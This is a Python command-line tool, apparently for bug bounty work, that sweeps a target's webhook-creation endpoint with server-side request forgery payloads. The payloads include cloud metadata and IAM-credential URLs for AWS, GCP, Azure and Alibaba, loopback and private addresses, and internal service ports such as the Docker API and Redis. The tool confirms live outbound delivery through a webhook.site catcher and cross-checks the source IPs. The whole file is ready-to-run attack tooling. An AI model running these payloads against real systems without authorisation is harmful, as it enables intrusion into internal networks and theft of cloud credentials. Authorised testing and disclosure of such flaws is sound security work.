#!/usr/bin/env python3
"""
Webhook SSRF prober — spins up a webhook.site catcher, fires internal/
cloud-metadata payloads at a target's webhook-config endpoint, confirms
live outbound delivery, and cross-checks source IPs against a target's
published IP allowlist (if one exists).

Built from the LaunchDarkly webhook SSRF finding (2026-07-02): LD's
/api/v2/webhooks accepted 169.254.169.254 / 127.0.0.1 / 10.0.0.1 /
metadata.google.internal with no host validation (port-only check),
and webhook.site + LD's own /api/v2/public-ip-list proved the requests
were genuinely fired from LD's infrastructure.
"""

import sys
import json
import time
import argparse
import urllib.request
import urllib.error


DEFAULT_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure IMDS
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://127.0.0.1/",
    "http://localhost/",
    "http://10.0.0.1/",
    "http://172.16.0.1/",
    "http://192.168.1.1/",
    "http://0.0.0.0/",
    "http://[::1]/",
]

INTERNAL_PORT_PAYLOADS = [
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",
    "http://127.0.0.1:9200/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8500/",  # Consul
    "http://127.0.0.1:2375/",  # Docker API
]


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def fetch(url: str, method: str = "GET", data: bytes | None = None,
          headers: dict | None = None, timeout: int = 15) -> tuple[int, bytes]:
    req_headers = {"User-Agent": "Mozilla/5.0 (compatible; bb-tools-ssrf/1.0)"}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return 0, str(e).encode()


def parse_headers(header_args: list[str]) -> dict:
    headers = {}
    for h in header_args:
        k, _, v = h.partition(":")
        headers[k.strip()] = v.strip()
    return headers


# ── webhook.site catcher ──────────────────────────────────────────────────────

def create_catcher() -> str:
    status, body = fetch("https://webhook.site/token", method="POST")
    if not (200 <= status < 300):
        print(f"[!] Failed to create catcher: HTTP {status}")
        sys.exit(1)
    uuid = json.loads(body)["uuid"]
    print(f"[+] Catcher created: https://webhook.site/{uuid}")
    print(f"[+] UUID (for `check`): {uuid}")
    return uuid


def check_catcher(uuid: str, quiet: bool = False) -> list[dict]:
    status, body = fetch(f"https://webhook.site/token/{uuid}/requests")
    if not (200 <= status < 300):
        print(f"[!] Failed to fetch requests: HTTP {status}")
        return []
    data = json.loads(body).get("data", [])
    if not quiet:
        if not data:
            print("[-] No requests captured yet.")
        for r in data:
            print(f"\n  [{r.get('created_at')}] {r.get('method')} from {r.get('ip')} "
                  f"({r.get('country_code', '?')})")
            print(f"    User-Agent: {r.get('headers', {}).get('user-agent', ['?'])[0]}")
            content = r.get("content", "") or ""
            print(f"    Body ({r.get('size', 0)}B): {content[:200]}")
    return data


# ── probe: fire payloads at target webhook-creation endpoint ────────────────

def probe(target_url: str, method: str, headers: dict, body_template: str,
          payloads: list[str]):
    print(f"[*] Probing {method} {target_url} with {len(payloads)} payloads\n")
    results = []
    for payload_url in payloads:
        body_str = body_template.replace("{URL}", payload_url)
        try:
            json.loads(body_str)  # validate substitution didn't break JSON
        except json.JSONDecodeError as e:
            print(f"[!] Body template broke JSON for payload {payload_url}: {e}")
            continue

        req_headers = dict(headers)
        req_headers.setdefault("Content-Type", "application/json")
        status, resp_body = fetch(target_url, method=method,
                                   data=body_str.encode(), headers=req_headers)
        accepted = 200 <= status < 300
        marker = "ACCEPTED" if accepted else "rejected"
        print(f"  [{marker:8}] {status}  {payload_url}")
        if not accepted:
            snippet = resp_body.decode(errors="replace")[:150]
            print(f"             -> {snippet}")
        results.append({"payload": payload_url, "status": status, "accepted": accepted})
        time.sleep(0.3)  # be polite to rate limits

    accepted_count = sum(1 for r in results if r["accepted"])
    print(f"\n[*] {accepted_count}/{len(results)} payloads accepted without validation error.")
    if accepted_count == len(results):
        print("[!!!] ALL internal/metadata payloads accepted - likely no host-based "
              "SSRF validation at all. Check for port-only validation by also trying "
              "a private IP on a non-standard port (e.g. http://127.0.0.1:8080/).")
    return results


# ── verify-ips: cross-check catcher hits against target's published IP list ──

def get_json_path(data: dict, path: str):
    cur = data
    for part in path.split("."):
        if isinstance(cur, dict):
            cur = cur.get(part)
        else:
            return None
    return cur


def verify_ips(observed_ips: list[str], list_url: str, json_path: str):
    status, body = fetch(list_url)
    if not (200 <= status < 300):
        print(f"[!] Failed to fetch IP list: HTTP {status}")
        return
    data = json.loads(body)
    published = get_json_path(data, json_path)
    if not isinstance(published, list):
        print(f"[!] json-path '{json_path}' did not resolve to a list. "
              f"Top-level keys: {list(data.keys())}")
        return
    published_ips = {ip.split("/")[0] for ip in published}
    print(f"[*] {len(published_ips)} published addresses fetched from {list_url}\n")
    for ip in observed_ips:
        if ip in published_ips:
            print(f"  [MATCH]    {ip} - confirms request came from target's own infra")
        else:
            print(f"  [no match] {ip} - not in published list (still worth noting)")


# ── full: catcher + probe + optional trigger + check, one shot ──────────────

def run_full(target_url: str, method: str, headers: dict, body_template: str,
             extra_payloads: list[str], trigger_url: str | None,
             trigger_method: str, trigger_body: str | None,
             trigger_headers: dict, wait: int, list_url: str | None,
             json_path: str):
    uuid = create_catcher()
    catcher_url = f"https://webhook.site/{uuid}"

    print("\n[*] Step 1: baseline - does the target even deliver to an external URL?")
    probe(target_url, method, headers, body_template, [catcher_url])

    payloads = DEFAULT_PAYLOADS + extra_payloads
    print("\n[*] Step 2: sweeping internal/metadata payloads")
    probe(target_url, method, headers, body_template, payloads)

    if trigger_url:
        print(f"\n[*] Step 3: firing trigger event ({trigger_method} {trigger_url})")
        data = trigger_body.encode() if trigger_body else None
        status, _ = fetch(trigger_url, method=trigger_method, data=data,
                           headers=trigger_headers or headers)
        print(f"    -> HTTP {status}")

    print(f"\n[*] Step 4: waiting {wait}s for delivery...")
    time.sleep(wait)

    print("\n[*] Step 5: checking catcher for confirmed live delivery")
    hits = check_catcher(uuid)

    if hits and list_url:
        print("\n[*] Step 6: cross-checking observed source IPs against published IP list")
        observed_ips = list({h["ip"] for h in hits})
        verify_ips(observed_ips, list_url, json_path)

    print(f"\n[+] Done. Catcher stays live: {catcher_url} "
          f"(webhook.site tokens expire after ~7 days)")


# ── CLI ───────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Webhook SSRF prober for bug bounty")
    sub = parser.add_subparsers(dest="cmd")

    sub.add_parser("catcher", help="Create a new webhook.site catcher")

    p_check = sub.add_parser("check", help="Poll a catcher for received requests")
    p_check.add_argument("uuid")

    p_probe = sub.add_parser("probe", help="Fire SSRF payloads at a webhook-creation endpoint")
    p_probe.add_argument("url", help="Target endpoint that accepts a webhook URL")
    p_probe.add_argument("--method", default="POST")
    p_probe.add_argument("-H", "--header", action="append", default=[], metavar="Key:Value")
    p_probe.add_argument("--body-template", required=True,
                          help="JSON body with {URL} placeholder, e.g. "
                               "'{\"url\":\"{URL}\",\"on\":true,\"name\":\"probe\"}'")
    p_probe.add_argument("--include-ports", action="store_true",
                          help="Also test internal service ports (22, 3306, 6379, etc.)")
    p_probe.add_argument("--extra", action="append", default=[],
                          help="Extra payload URL(s) to test, can repeat")

    p_verify = sub.add_parser("verify-ips", help="Cross-check IPs against a published IP list")
    p_verify.add_argument("--ips", required=True, help="Comma-separated observed source IPs")
    p_verify.add_argument("--list-url", required=True, help="URL returning the published IP list")
    p_verify.add_argument("--json-path", default="outboundAddresses",
                           help="Dot-path to the array in the response (default: outboundAddresses)")

    p_full = sub.add_parser("full", help="Catcher + probe + optional trigger + check, one shot")
    p_full.add_argument("url", help="Target webhook-creation endpoint")
    p_full.add_argument("--method", default="POST")
    p_full.add_argument("-H", "--header", action="append", default=[], metavar="Key:Value")
    p_full.add_argument("--body-template", required=True)
    p_full.add_argument("--extra", action="append", default=[])
    p_full.add_argument("--trigger-url")
    p_full.add_argument("--trigger-method", default="POST")
    p_full.add_argument("--trigger-body")
    p_full.add_argument("--trigger-header", action="append", default=[], metavar="Key:Value")
    p_full.add_argument("--wait", type=int, default=5)
    p_full.add_argument("--list-url", help="Target's published IP-list endpoint, if known")
    p_full.add_argument("--json-path", default="outboundAddresses")

    args = parser.parse_args()

    if args.cmd is None:
        parser.print_help()
        return

    if args.cmd == "catcher":
        create_catcher()

    elif args.cmd == "check":
        check_catcher(args.uuid)

    elif args.cmd == "probe":
        headers = parse_headers(args.header)
        payloads = list(DEFAULT_PAYLOADS)
        if args.include_ports:
            payloads += INTERNAL_PORT_PAYLOADS
        payloads += args.extra
        probe(args.url, args.method, headers, args.body_template, payloads)

    elif args.cmd == "verify-ips":
        ips = [ip.strip() for ip in args.ips.split(",") if ip.strip()]
        verify_ips(ips, args.list_url, args.json_path)

    elif args.cmd == "full":
        headers = parse_headers(args.header)
        trigger_headers = parse_headers(args.trigger_header) if args.trigger_header else {}
        run_full(args.url, args.method, headers, args.body_template, args.extra,
                  args.trigger_url, args.trigger_method, args.trigger_body,
                  trigger_headers, args.wait, args.list_url, args.json_path)


if __name__ == "__main__":
    main()
